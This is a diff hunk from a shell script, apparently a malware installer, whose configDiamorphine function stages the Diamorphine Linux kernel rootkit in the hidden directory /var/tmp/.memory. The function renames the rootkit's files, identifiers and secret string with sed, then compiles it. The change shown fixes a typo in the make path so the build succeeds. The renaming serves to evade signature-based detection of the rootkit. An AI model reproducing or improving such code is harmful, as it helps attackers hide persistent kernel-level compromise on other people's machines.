@@ -128,7 +128,7 @@ configDiamorphine() {
     mv /var/tmp/.memory/diamorphine.h /var/tmp/.memory/root.h
     sed -i 's/diamorphine_secret/dynasty/g' /var/tmp/.memory/root.h
     sed -i 's/diamorphine/dynasty/g' /var/tmp/.memory/root.h
-    make -C /var/tmp/.memeory
+    make -C /var/tmp/.memory
     sed -i 's/diamorphine.h/root.h/g' /var/tmp/.memory/root.c
     sed -i 's/diamorphine_init/root_init/g' /var/tmp/.memory/root.c 
     sed -i 's/diamorphine_cleanup/root_clean/g' /var/tmp/.memory/root.c
